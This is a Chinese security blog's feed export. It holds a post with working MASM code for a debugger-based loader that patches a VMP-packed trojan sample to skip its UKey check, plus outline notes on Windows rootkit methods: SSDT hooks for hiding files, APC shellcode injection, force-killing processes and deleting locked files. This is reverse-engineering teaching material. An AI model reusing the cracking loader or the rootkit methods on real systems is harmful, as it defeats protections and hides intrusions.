<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p>Saif El-Sherei的代码及文章：<br><a href="https://github.com/sensepost/gdi-palettes-exp" target="_blank" rel="noopener">https://github.com/sensepost/gdi-palettes-exp</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>内核原理</tag>
        <tag>内核漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>2018-01-10-利用硬件断点Hook法不脱壳爆破某VMP加壳程序</title>
    <url>/2018/01/10/2018-01-10-%E4%B8%8D%E8%84%B1%E5%A3%B3%E7%88%86%E7%A0%B4%E6%9F%90VMP%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<blockquote>
<p>前几天得到一个VMP加壳的木马程序，要求bypass掉它的UKey弹框验证，虽然乍一看感觉挺麻烦的，当然最重要的是完成指标即可，没必要脱壳，能尽量减少工作量。因为不脱壳情况下代码未解密且存在文件校验，无法打文件补丁，最后考虑到这个程序的VMP壳没有开启反调试选项，所以最终通过模拟一个简单调试器完成了挂载程序爆破搞定，实际一共也就花了三四个小时。</p>
</blockquote>
<a id="more"></a>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>&ensp;&ensp;&ensp;&ensp;首先查了下壳没有查出来，看了下有vmp0、vmp1的区段名字，因为实现告知是VMP，也没有再去验证了，直接运行程序看看能不能不脱壳破解，先运行程序弹出下图的提示字符串：

<p><img src="1.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;还是从字符串信息入手，寻找弹框代码的位置，因为加壳了，直接在程序刚载入到OD的状态是搜不到这个字符串的，运行到弹出消息框再搜索这个字符串就行，共找到对这个字符串的两处引用：

<p><img src="2.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;再来分析下这两处引用该字符串的代码，第一处代码可以看到有两个判断不通过会跳转到弹框流程：

<p><img src="3.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;第二处代码的判断跟上面类似：

<p><img src="4.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;先来试试直接爆破掉0x56FF47、0x56FF55、0x56FFBA这三个判断的结果，OD载入程序之后在0x56FF45地址下硬件执行断点，运行出发断点之后修改0x56FF47处指令为jz、0x56FF55及0x56FFBA处指令为jnz，再恢复运行即可看到程序正常运行到配置界面不再弹框。

<p><img src="5.png" alt=""></p>
<hr>
<h2 id="编写Patch程序"><a href="#编写Patch程序" class="headerlink" title="编写Patch程序"></a>编写Patch程序</h2><p>&ensp;&ensp;&ensp;&ensp;下面就是如何根据爆破的结果编写补丁程序了，因为程序被加壳了，需要Patch的三个地址0x56FF47、0x56FF55、0x56FFBA在程序刚载入的时候代码并未被解密，定位并修改被加密过的代码比较麻烦，而且壳里也会进行代码校验，就打算采取相比其它补丁方式来说最方便的硬件断点Hook办法，写一个简单的调试器程序，仿照上一步OD挂载程序手工爆破的步骤，设置0x56FF45地址的硬件断点，等代码解密断在0x56FF45地址之后在单步异常0x80000004的处理程序中再修改0x56FF47、0x56FF55、0x56FFBA这三个地址的数据内容。
<p>&ensp;&ensp;&ensp;&ensp;重新完成一个调试器程序比较麻烦，就在网上搜了下现成的代码，最后是根据http://blog.chinaunix.net/uid-20547722-id-1647182.html链接中的代码修改编译的补丁程序，下面介绍下补丁代码patch.exe的一些思路


<ol>
<li>patch.exe以调试状态启动sample.exe，并进入循环接受调试事件状态。</li>
<li>sample.exe在载入时会先给调试器patch.exe发送一个初始的断点事件，异常代码0x80000003，这也是patch.exe接受到的第一个调试异常，接收到该异常事件之后patch.exe修改sample.exe的入口点代码为int3中断指令的机器码0xCC，这一步是为了下一步在程序完全载入到内存时能够让调试器接管设置硬件断点。</li>
<li>继续运行sample.exe，patch.exe接收到第2步设置在入口点的断点异常，在异常处理代码中获取ThreadContext，设置Dr0、Dr7调试寄存器的值恢复运行。</li>
<li>patch.exe接收到硬件断点触发的单步异常，在异常处理程序中对0x56FF47、0x56FF55、0x56FFBA处的代码进行修改，这里我其实是直接把EIP寄存器的值改为0x56FF49跳过了0x56FF47地址处的检查，0x56FF55、0x56FFBA地址指令改成jnz，最后恢复运行就行了。</li>
</ol>
<hr>
<h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><ol>
<li>这个壳里没有使用一些反调试技术，所以使用这种方式还比较简单，如果是其它壳有些检测调试的话还需要做针对性的处理。</li>
<li>在patch.exe调试sample.exe的第2、3步骤中，之所以先修改入口点的代码为int3运行触发之后再设置硬件断点是因为初始断点不能设置硬件断点，见下图的示例：</li>
</ol>
<p><img src="6.png" alt=""></p>
<ol start="3">
<li>最初调试的时候想根据程序运行时候触发的一个0x0EEDFADE的异常再做爆破的，直接在这个异常处理程序中设置爆破就行，结果写完测试程序第一次运行爆破成功之后再运行补丁程序就再也没有0x0EEDFADE这个异常了，就还改成了最终这样设置硬件断点的办法。</li>
<li>因为修改的网上代码，有一些冗余的变量等等都没有清除，代码也不是很清晰，最后测试能用也就没有细改了。</li>
</ol>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat, stdcall  </span><br><span class="line">option casemap :none  </span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">include windows.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include Comctl32.inc</span><br><span class="line">include comdlg32.inc</span><br><span class="line">;include macros.inc</span><br><span class="line">include masm32.inc</span><br><span class="line"></span><br><span class="line">includelib kernel32.lib</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib Comctl32.lib</span><br><span class="line">includelib comdlg32.lib</span><br><span class="line">includelib masm32.lib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dwOrgOEP       equ 00a6ee02h ;程序原始入口</span><br><span class="line">BREAK_POINT1   equ 0056FF45h ;第一个断点</span><br><span class="line">;BREAK_POINT1   equ 0056FF45h ;第一个断点</span><br><span class="line">.CONST</span><br><span class="line">DR0_ENABLED              EQU 000000001b</span><br><span class="line">LOCAL_EXACT_BPM_ENABLED  EQU 100000000b</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">FileName      db &apos;sample.exe&apos;,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">int3          db 0cch   </span><br><span class="line">value         db 8 dup(?)</span><br><span class="line">buffer        db 8 dup(?)</span><br><span class="line">oldbyte       db 8 dup(?)  </span><br><span class="line">szFormat      db &quot;%X&quot;,0</span><br><span class="line">dwCountSS     dd 0</span><br><span class="line">dwCountBP     dd 0</span><br><span class="line">Startup       STARTUPINFO &lt;&gt;</span><br><span class="line">processinfo   PROCESS_INFORMATION &lt;&gt;  </span><br><span class="line"></span><br><span class="line">patchto90 db 2 dup(090h)</span><br><span class="line">patchto75 db 2 dup(075h)</span><br><span class="line">.data?</span><br><span class="line">startinfo     STARTUPINFO &lt;&gt; </span><br><span class="line">pi            PROCESS_INFORMATION &lt;&gt; </span><br><span class="line">DBEvent       DEBUG_EVENT &lt;&gt; </span><br><span class="line">context       CONTEXT &lt;&gt;</span><br><span class="line"></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">       pushad</span><br><span class="line">;********************************************************************</span><br><span class="line">; 创建进程</span><br><span class="line">;********************************************************************        </span><br><span class="line">       invoke CreateProcess, addr FileName, NULL, NULL, NULL, FALSE, DEBUG_PROCESS or DEBUG_ONLY_THIS_PROCESS, NULL, NULL, addr startinfo, addr pi </span><br><span class="line">       .if    !eax</span><br><span class="line">        ;invoke MessageBox,hDlg,CTXT(&quot;不能创建进程&quot;),CTXT(&quot;错误！&quot;),MB_OK</span><br><span class="line">        invoke ExitProcess,NULL</span><br><span class="line">       .endif</span><br><span class="line">        xor  eax,eax</span><br><span class="line">  mov  dwCountBP, eax</span><br><span class="line">  mov  dwCountSS, eax</span><br><span class="line">;********************************************************************</span><br><span class="line">; 调试进程，进入循环调试</span><br><span class="line">;********************************************************************</span><br><span class="line">.while TRUE  </span><br><span class="line">         invoke WaitForDebugEvent, addr DBEvent, INFINITE              </span><br><span class="line">.if DBEvent.dwDebugEventCode==EXIT_PROCESS_DEBUG_EVENT </span><br><span class="line">         ;invoke MessageBox, 0, CTXT(&quot;退出进程...&quot;), CTXT(&quot;提示！&quot;), MB_OK+MB_ICONINFORMATION </span><br><span class="line">         .break </span><br><span class="line">;********************************************************************</span><br><span class="line">; 异常中断</span><br><span class="line">;********************************************************************   </span><br><span class="line">.elseif DBEvent.dwDebugEventCode==EXCEPTION_DEBUG_EVENT   </span><br><span class="line">         .if DBEvent.u.Exception.pExceptionRecord.ExceptionCode==EXCEPTION_BREAKPOINT                  </span><br><span class="line">;********************************************************************</span><br><span class="line">; 第一次中断时在原始入口点处设置断点</span><br><span class="line">;********************************************************************  </span><br><span class="line">              inc     dwCountBP</span><br><span class="line">                  .if dwCountBP==1 </span><br><span class="line">                invoke  ReadProcessMemory, pi.hProcess, dwOrgOEP, addr oldbyte, 1, 0   ;在dwOrgOEP中读出一个字节</span><br><span class="line">                      invoke  WriteProcessMemory, pi.hProcess, dwOrgOEP, addr int3, 1, 0     ;写入INT3断点                 </span><br><span class="line">;********************************************************************</span><br><span class="line">; 第二次中断，中断在起先设置的原始入口点，恢复代码，在机器码处设置硬件断点</span><br><span class="line">;********************************************************************  </span><br><span class="line">                  .elseif dwCountBP==2                       </span><br><span class="line">                       mov  context.ContextFlags, CONTEXT_CONTROL</span><br><span class="line">                       invoke  GetThreadContext, pi.hThread, addr context</span><br><span class="line">                       dec  context.regEip</span><br><span class="line">                       invoke  WriteProcessMemory, pi.hProcess, dwOrgOEP, addr oldbyte, 1, 0  ;恢复入口代码</span><br><span class="line">                       invoke  SetThreadContext, pi.hThread, addr context</span><br><span class="line">                       mov     context.ContextFlags, CONTEXT_DEBUG_REGISTERS</span><br><span class="line">                       invoke  GetThreadContext, pi.hThread, addr context</span><br><span class="line">                       mov    context.iDr0, BREAK_POINT1                                       ;设置硬件断点      </span><br><span class="line">                       mov    context.iDr7, LOCAL_EXACT_BPM_ENABLED + DR0_ENABLED</span><br><span class="line">                       invoke  SetThreadContext, pi.hThread, addr context                                       </span><br><span class="line">                  .endif</span><br><span class="line">                       invoke  ContinueDebugEvent, DBEvent.dwProcessId, DBEvent.dwThreadId, DBG_CONTINUE</span><br><span class="line">                       .continue               </span><br><span class="line">          .elseif DBEvent.u.Exception.pExceptionRecord.ExceptionCode==EXCEPTION_SINGLE_STEP;0eedfadeh        ;EXCEPTION_SINGLE_STEP    ;单步运行模式     </span><br><span class="line"></span><br><span class="line">             inc    dwCountSS                  </span><br><span class="line">	        .IF dwCountSS == 1</span><br><span class="line">;	                       mov     context.ContextFlags, CONTEXT_FULL</span><br><span class="line">;	                       invoke  GetThreadContext, pi.hThread, addr context</span><br><span class="line">;	                       mov eax,context.regEax                                                      </span><br><span class="line"></span><br><span class="line">	                       invoke  WriteProcessMemory,pi.hProcess,056ff47h,addr patchto90,02h,NULL   ;</span><br><span class="line">	                       invoke  WriteProcessMemory,pi.hProcess,056ff55h,addr patchto75,01h,NULL   ;</span><br><span class="line">	                       invoke  WriteProcessMemory,pi.hProcess,056ffbah,addr patchto75,01h,NULL   ;</span><br><span class="line">	</span><br><span class="line">                               mov     context.ContextFlags, CONTEXT_FULL</span><br><span class="line">                               invoke  GetThreadContext, pi.hThread, addr context</span><br><span class="line">	                       mov context.regEip ,056ff49h                                                   </span><br><span class="line">                       	       ;add EAX,01h</span><br><span class="line">                       	       </span><br><span class="line">                       	       mov     context.iDr0, 0</span><br><span class="line">                               mov     context.iDr7, 0  </span><br><span class="line">                               invoke  SetThreadContext,pi.hThread, addr context   </span><br><span class="line">	                       invoke  ContinueDebugEvent, DBEvent.dwProcessId, DBEvent.dwThreadId, DBG_CONTINUE</span><br><span class="line">	                      .continue                                             </span><br><span class="line">	        .endif</span><br><span class="line">             invoke  ContinueDebugEvent, DBEvent.dwProcessId,DBEvent.dwThreadId, DBG_CONTINUE</span><br><span class="line">         .endif</span><br><span class="line">.endif</span><br><span class="line">   invoke  ContinueDebugEvent, DBEvent.dwProcessId,DBEvent.dwThreadId, DBG_EXCEPTION_NOT_HANDLED</span><br><span class="line">.endw</span><br><span class="line">;********************************************************************</span><br><span class="line">; 结束线程</span><br><span class="line">;******************************************************************** </span><br><span class="line">        invoke  CloseHandle, pi.hThread</span><br><span class="line">        invoke  CloseHandle, pi.hProcess</span><br><span class="line">       </span><br><span class="line">    popad</span><br><span class="line">    ret </span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>脱壳破解</category>
      </categories>
      <tags>
        <tag>VMP壳</tag>
        <tag>硬件断点</tag>
        <tag>调试器</tag>
      </tags>
  </entry>
  <entry>
    <title>2018-02-06-Windows内核驱动与Rootkit杂记</title>
    <url>/2018/02/06/2018-02-06-Windows%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E4%B8%8ERootkit%E6%9D%82%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;这里主要介绍一下Windows驱动开发的一些基础知识，善用Windows驱动可以做到很多事情，比如常见的Rootkit隐藏文件、进程等，其实不仅仅是隐藏自身的目的，驱动可以做很多事情，获取到内核之后基本无所不能，但是很多情况下是理论上的，实际做到可能门槛很高，代价大，下面首先介绍一下驱动开发环境的配置（PS：本文是2020年初把以前内部交流的PPT整理了下发布，描述比较简单仅为个人整理记录备忘用，部分图片及文字描述如IRP部分来自麦洛克菲内核编程培训，其它有一部分忘记来源，当时是内部交流没注意保留来源，后来找不到出处了，如有侵权请与我联系标注来源）。
</blockquote>
<a id="more"></a>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="驱动编程开发环境"><a href="#驱动编程开发环境" class="headerlink" title="驱动编程开发环境"></a>驱动编程开发环境</h3><p>首先需要安装WDK：<br><img src="%E5%9B%BE%E7%89%870.png" alt=""><br>IDE的话可以选择VS2013 Or VS 2010+VisualDDK：<br><img src="%E5%9B%BE%E7%89%871.png" alt=""><br>VS2013及以后的VS都自带驱动编程解决方案。<br><img src="%E5%9B%BE%E7%89%872.png" alt=""><br>下面介绍驱动调试环境。</p>
<h3 id="驱动调试环境"><a href="#驱动调试环境" class="headerlink" title="驱动调试环境"></a>驱动调试环境</h3><p>Vmware、VirtualBox<br>Windbg ：包含在WDK里<br>VirtualKD ：快速搭建双机调试环境<br>调试符号：对象文件调试信息<br><img src="%E5%9B%BE%E7%89%874.png" alt=""></p>
<h4 id="Windbg简介"><a href="#Windbg简介" class="headerlink" title="Windbg简介"></a>Windbg简介</h4><p>功能无比强大的调试器，支持内核态、用户态，以及源码调试等。<br><img src="%E5%9B%BE%E7%89%875.png" alt=""></p>
<h4 id="IDA简介"><a href="#IDA简介" class="headerlink" title="IDA简介"></a>IDA简介</h4><p>功能无比强大的静态分析神器。<br>反编译、交叉引用、图形模式…</p>
<p><img src="%E5%9B%BE%E7%89%876.png" alt=""></p>
<h2 id="驱动加载"><a href="#驱动加载" class="headerlink" title="驱动加载"></a>驱动加载</h2><p>这里只介绍最常规的NT驱动的加载，</p>
<ol>
<li>INF文件安装</li>
<li>DriverMonitor.exe</li>
<li>自己瞎编<br>OpenSCManager<br>CreateService<br>OpenService<br>StartService<br><img src="%E5%9B%BE%E7%89%877.png" alt=""></li>
</ol>
<p>自己编写驱动使用DriverMonitor就足够了，DriverMonitor使用也比较简单。<br>如果是自己的木马加载驱动的话就需要自己写程序了。</p>
<h2 id="数据交互"><a href="#数据交互" class="headerlink" title="数据交互"></a>数据交互</h2><p>下面介绍开始介绍驱动加载到系统之后，应用层程序如何与驱动进行数据交互，在这之前先介绍一下一些概念。</p>
<blockquote>
<p>IRP:<br>应用层API调用之后底层发生了什么？<br><img src="%E5%9B%BE%E7%89%878.png" alt=""></p>
</blockquote>
<p>IRP可以先简单理解为驱动分发函数的参数。重点看一下IRP头部紧挨着的就是IO_STACK_LOCATION,从n-0代表下面每一层的参数。<br>再来看一下过滤驱动的实现代码里怎么处理的IRP。<br><img src="%E5%9B%BE%E7%89%879.png" alt=""></p>
<p>看下这段代码，DispatchCommon一般实现就是不处理直接下发到下一层设备。<br><img src="%E5%9B%BE%E7%89%8710.png" alt=""><br>从这里Create/Read/Write/DeviceIoControl/Close也可以看出驱动一般对读写DeviceIoControl等进行处理，也就是数据交互的地方</p>
<p>这是读写分发函数，看代码，这里就是从IRP中取出参数，然后返回数据。<br><img src="%E5%9B%BE%E7%89%8711.png" alt=""><br><img src="%E5%9B%BE%E7%89%8712.png" alt=""><br><img src="%E5%9B%BE%E7%89%8713.png" alt=""><br>重点看一下IRP头部紧挨着的就是IO_STACK_LOCATION,从n-0代表下面每一层的参数。<br>所以IoGetCurrentIrpStackLocation函数获取本层的参数。</p>
<p>前面介绍完读写的处理，可能觉得不够灵活，下面介绍的DeviceIoControl就是最常用的数据传递手段。</p>
<blockquote>
<p>DeviceIoControl：<br>用户态调用DeviceIoControl函数向驱动发送特定CTL_CODE，向内核态传递数据。</p>
</blockquote>
<p><img src="%E5%9B%BE%E7%89%8714.png" alt=""><br>CTL code 包含控制请求的相关信息，驱动程序接受到之后根据此进行数据的获取。看代码。<br><img src="%E5%9B%BE%E7%89%8715.png" alt=""><br><img src="%E5%9B%BE%E7%89%8716.png" alt=""><br>三种数据传递方式原理:</p>
<ol>
<li>Buffer IO<br>系统会将用户提供的输入缓冲区的内容复制到IRP中，使用完毕之后重新拷贝至输出缓冲区。</li>
<li>Direct IO<br>将DeviceIoControl指定的输出缓冲区锁定，在内核模式地址下重新映射一段地址。<br>METHOD_IN_DIRECT及METHOD_OUT_DIRECT</li>
<li>Neither  IO<br>直接访问用户模式地址，危险！</li>
</ol>
<p>CTL code 包含三种数据传递方式，下面介绍下区别。</p>
<ol>
<li>BufferIO:安全 效率略差<br>METHOD_BUFFERED<br>输入输出缓冲区：<br>pIrp-&gt;AssociatedIrp.SystemBuffer<br>缓冲区大小：<br><img src="%E5%9B%BE%E7%89%8716-2.png" alt=""></li>
<li>DirectIO:<br>METHOD_DIRECTED<br>输入缓冲区：<br>pIrp-&gt;AssociatedIrp.SystemBuffer<br>输出缓冲区<br>pIrp-&gt;MdlAddress<br>MDL：内存描述符列表，将同一块内存同时映射到用户态空间和内核。<br>缓冲区大小：<br>Parameters.DeviceIoControl.InputBufferLength;<br>Parameters.DeviceIoControl.OutputBufferLength; </li>
</ol>
<blockquote>
<p>MDL:刚才介绍锁定重新映射的概念，主要通过MDL实现<br>如何使用户态进程与核心态驱动共享内存呢 ?32位Windows中，默认状态下虚拟空间有4G，前2G是每个进程私有的，也就是说在进程切换的时候会变化，后2G是操作系统的，所以是固定的。既然用户态进程和核心态驱动在同一个进程空间里，是不是只要直接传个内存地址过来，就可以访问了？理论上可以但实际上不行，因为用户态的进程在不断地切换，使驱动运行时没法保证前面的用户态进程是哪个，也就不确定前2G虚拟地址空间的映射情况，那么用户态进程传来的地址也许不是合法的。<br><img src="%E5%9B%BE%E7%89%8717.png" alt=""><br>3. NeitherIO:。<br>METHOD_NEITHER<br>输入缓冲区：<br>Parameters.DeviceIoControl.Type3InputBuffer;<br>输出缓冲区<br>pIrp-&gt;UserBuffer<br>缓冲区大小：<br>Parameters.DeviceIoControl.InputBufferLength;<br>Parameters.DeviceIoControl.OutputBufferLength; </p>
</blockquote>
<p>这一段完毕，下面介绍文件系统过滤驱动，在此之前先简单介绍一下Windbg的一些命令</p>
<blockquote>
<p>Windbg命令-1</p>
<ol>
<li>断点类<br>Bp    软断点<br>例：bp 0x401000;bp nt!NtEnumerateValueKey<br>Ba     硬件断点<br>例：ba r4/w2/e1 0x401000;读、写、执行断点</li>
<li>查看数据<br>dd 查看数据<br>例：dd 0x400000<br>dt 结构体方式查看<br>例：dt _PEB<br>断点的实现原理：CC软断点，写程序断点     硬件断点：调试寄存器,有兴趣可以研究调试器原理。<br>Dt后面可以加地址。</li>
</ol>
</blockquote>
<h2 id="文件过滤驱动"><a href="#文件过滤驱动" class="headerlink" title="文件过滤驱动"></a>文件过滤驱动</h2><p><img src="%E5%9B%BE%E7%89%8717-2.png" alt=""><br>sFilter框架</p>
<ol>
<li>生成控制设备</li>
<li>注册分发函数</li>
<li>绑定设备</li>
<li>读写…过滤</li>
</ol>
<p>文件过滤分发函数及对应功能</p>
<ol>
<li>FilterCreate        创建/打开</li>
<li>FilterRead        读、加解密处理</li>
<li>FilterWrite          写、加解密处理</li>
<li>FilterSetInfo       删、重命名等操作</li>
<li>FilterClean          写关闭<br><img src="%E5%9B%BE%E7%89%8718.png" alt=""><br>其它：MiniFilter 隐藏文件<h2 id="网络过滤驱动"><a href="#网络过滤驱动" class="headerlink" title="网络过滤驱动"></a>网络过滤驱动</h2>框架种类：<br>TDI，NDIS驱动（小端口驱动/中间层驱动/协议驱动），WFP……<br>应用：<br>构建隐蔽通道，流量监控，网络防火墙…</li>
</ol>
<p><img src="%E5%9B%BE%E7%89%8718-2.png" alt=""><br>TDi 驱动可以实现一套内核层的隐蔽链接。</p>
<p>IM驱动和过滤驱动相比，有什么利弊之分？<br>1.IM有最好的通用性，可以在WINXP,WIN2K,VISTA,WIN7中全面兼容，但它对VISTA与WIN7中的支持，是通过在通信函数中加入从NDIS_PACKET至NET_BUFFER转换层实现，所以性能在WIN7下应该是反而减弱了。<br>2.过滤驱动是直接使用NET_BUFFER来进行通信的，这种方式会有更好性能，主要的原因是NET_BUFFER使用了新的数据表示方法，避免的频繁的内存复制。具体可以参考MSDN。但很明显，它无法支持WINXP及之前的系统。</p>
<p>NDIS Filter框架:<br>微软建议使用NDIS Filter替代NDIS IMD。<br>特点:</p>
<ul>
<li>VS2013+WDK集成</li>
<li>灵活方便</li>
<li>性能更好</li>
</ul>
<p>NDIS Filter框架:</p>
<ol>
<li>DriverEntry</li>
</ol>
<ul>
<li>NDIS_FILTER_DRIVER_CHARACTERISTICS<br>指定一些Filter驱动的特性</li>
<li>NdisFRegisterFilterDriver<br>注册驱动</li>
</ul>
<ol start="2">
<li>FilterSendNetBufferLists<br>过滤一个NET_BUFFER_LIST的发送。</li>
<li>FilterReceiveNetBufferLists<br>过滤一个NET_BUFFER_LIST的接收。</li>
</ol>
<p><img src="%E5%9B%BE%E7%89%8720.png" alt=""><br>LWF中用它自己的方式存储以太网中的数据帧，这就是NBL(NET_BUFFER_LIST)，也就是在代码中，通过你注册的回调函数的参数系统将数据以PNET_BUFFER_LIST形式会传递给你，这时候你就能做数据过滤的操作了。这是个LIST，其中每个NBL又包含若干个NB(NET_BUFFER)，每个NB有包含若干个MDL。真正的数据在这MDL中。</p>
<h2 id="内核反调试"><a href="#内核反调试" class="headerlink" title="内核反调试"></a>内核反调试</h2><p>KdDisableDebugger<br><img src="%E5%9B%BE%E7%89%8721.png" alt=""><br>KdDebuggerNotPresent<br>KdSendPacket、KdRecivePacket<br><img src="%E5%9B%BE%E7%89%8722.png" alt=""></p>
<blockquote>
<p>Windbg命令-2</p>
<ol>
<li>查看符号<br>x命令：<br><img src="%E5%9B%BE%E7%89%8723.png" alt=""></li>
<li>查看汇编<br>u 显示8条指令<br>uf 显示整个函数<br>ub 显示eip前面的代码<br><img src="%E5%9B%BE%E7%89%8724.png" alt=""></li>
</ol>
</blockquote>
<h2 id="SSDT-HOOK"><a href="#SSDT-HOOK" class="headerlink" title="SSDT HOOK"></a>SSDT HOOK</h2><p>SSDT:<br>System Services Descriptor Table，系统服务描述符表。Windows系统中存在两个：</p>
<ul>
<li>KeServiceDescriptorTable<br>主要处理Kernel32.dll 中系统调用。</li>
<li>KeServiceDescriptorTableShadow<br>主要处理 User32.dll 和 GDI32.dll 中系统调用。</li>
</ul>
<p><img src="%E5%9B%BE%E7%89%8725.png" alt=""><br>并且 KeServiceDescriptorTable 在 ntoskrnl.exe(Windows 操作系统内核文件，包括内核和执行体层)是导出的，<br>而 KeServiceDescriptorTableShadow 则是没有被 Windows 操作系统所导出，<br>而关于 SSDT 的全部内容则都是通过 KeServiceDescriptorTable 来完成的</p>
<p>Demo:<br><img src="%E5%9B%BE%E7%89%8726.png" alt=""><br><img src="%E5%9B%BE%E7%89%8727.png" alt=""><br><img src="%E5%9B%BE%E7%89%8728.png" alt=""><br><img src="%E5%9B%BE%E7%89%8729.png" alt=""><br><img src="%E5%9B%BE%E7%89%8730.png" alt=""><br>SSDT HOOK能做什么？</p>
<ul>
<li>文件/注册表/进程隐藏</li>
<li>进程保护</li>
<li>监控模块加载</li>
<li>…..</li>
</ul>
<p>怎么编程定位SSDT地址？</p>
<ul>
<li>KeServiceDescriptorTable 在 ntoskrnl.exe是导出的，直接声明引用即可。</li>
</ul>
<p><img src="%E5%9B%BE%E7%89%8731-0.png" alt=""></p>
<p>如何修改SSDT表项？</p>
<ul>
<li>系统对 SSDT 都是只读的，不能直接写</li>
</ul>
<p><img src="%E5%9B%BE%E7%89%8731.png" alt=""><br><img src="%E5%9B%BE%E7%89%8732.png" alt=""></p>
<p>示例：古老的ssdt hook隐藏文件<br><img src="%E5%9B%BE%E7%89%8733.png" alt=""></p>
<blockquote>
<p>Tips：Zw？Nt？<br>区别<br>ba e1 nt!NtEnumerateValueKey查看<br>Ntdll.dll中两者一样<br>Ntoskrnl.exe中nt函数更底层，Zw<em>函数会把PreviousMode设置为KernelMode  然后再调用Nt</em>函数，因此在Nt<em>函数中就不会进行参数检查。如果直接调用Nt</em>函数的话 , 必须自己将PreviousMode设置为KernelMode,否则PreviousMode很可能仍然是UserMode, 这样的话 Nt*函数就会产生问题。</p>
</blockquote>
<blockquote>
<p>Tips：xuetr(pc hunter)<br><img src="%E5%9B%BE%E7%89%8734.png" alt=""></p>
</blockquote>
<blockquote>
<p>Tips：PatchGuard<br><img src="%E5%9B%BE%E7%89%8735.png" alt=""></p>
</blockquote>
<blockquote>
<p>Tips：APC相关结构</p>
<ul>
<li>_EPROCESS执行体进程块    <pre><code>进程对象，与用户态的PEB结构联系很大，除了包含许多与进程有关的属性之外，还包含和指向许多其他的相关数据结构。</code></pre></li>
<li>_THREAD执行体线程块    <pre><code>ETHREAD(执行体线程块)是执行体层上的线程对象的数据结构。在windows内核中，每个进程的每一个线程都对应着一个ETHREAD数据结构。</code></pre></li>
</ul>
</blockquote>
<p><img src="%E5%9B%BE%E7%89%8736.png" alt=""></p>
<h2 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h2><p>APC简介:<br>异步过程调用，给程序在本函数返回后还能执行的机会。包括内核APC及用户APC。</p>
<p>APC注入步骤:</p>
<ol>
<li>遍历进程列表寻找合适进程、线程</li>
<li>在目标进程中申请空间布置Shellcode</li>
<li>KeInitializeApc初始化APC</li>
<li>KeInsertQueueApc插入APC</li>
</ol>
<p>内核如何遍历进程列表:<br>PsGetCurrentProcess()<br>ActiveProcessLinks</p>
<p>在目标进程中申请空间:<br>KeStackAttachProcess/KeUnstackDetachProcess<br>MDL或ZwAllocateVirtualMemory</p>
<p>相关事项及说明:<br>当线程在alertable状态时才执行这些APC函数<br>Win7系统内核在目标进程中分配内存不要使用MDL，没有执行权限，进程会崩溃，可以使用ZwAllocateVirtualMemory，WinXP上不受影响。</p>
<p>比较简单，还有其他Usermodecallback等方式的注入,可以了解下。</p>
<h2 id="强杀进程"><a href="#强杀进程" class="headerlink" title="强杀进程"></a>强杀进程</h2><ol>
<li>暴力搜索PspTerminateProcess函数地址</li>
<li>PspTerminateProcess函数未导出</li>
<li>NtQuerySystemInformation两次调用获取nt基址</li>
<li>搜索特征获取PspTerminateProcess地址并调用</li>
</ol>
<p>NtQuerySystemInformation Win8好像还能用后面就禁用了。</p>
<h2 id="强删文件"><a href="#强删文件" class="headerlink" title="强删文件"></a>强删文件</h2><p><img src="%E5%9B%BE%E7%89%8737.png" alt=""><br><img src="%E5%9B%BE%E7%89%8738.png" alt=""><br>文件独占如何删？</p>
<ol>
<li>枚举句柄表 ZwQuerySystemInformation </li>
<li>复制句柄 ZwDuplicateObject然后ZwClose </li>
<li>使用DUPLICATE_CLOSE_SOURCE再次ZwDuplicateObject，然后ZwClose</li>
</ol>
<p>正在运行如何删？</p>
<ol>
<li>NtfsSetDispositionInfo-&gt;MmFlushImageSection检查</li>
<li>ImageSectionObject 和 DataSectionObject设为0<br>构建IRP包发送</li>
</ol>
<p>删除文件时会先到NTFS.sys的分派例程，NtfsSetDispositionInfo-》MmFlushImageSection。MmFlushImageSection检查这个文件对象的SECTION_OBJECT_POINter结构是不是为空，没有在运行直接返回TRUE。所以如果想要删除正在运行的文件，一种方法是设置SECTION_OBJECT_POINter结构里的变量都为0。这样MmFlushImageSection为返回TRUE，表示能删除。另一种方法是HOOK NTFS.sys的导入表中的MmFlushImageSection（）函数，在HOOK函数中检查是不是我们要删除的文件，是的话直接返回TRUE也行</p>
<p>如何构建IRP包发送:</p>
<ul>
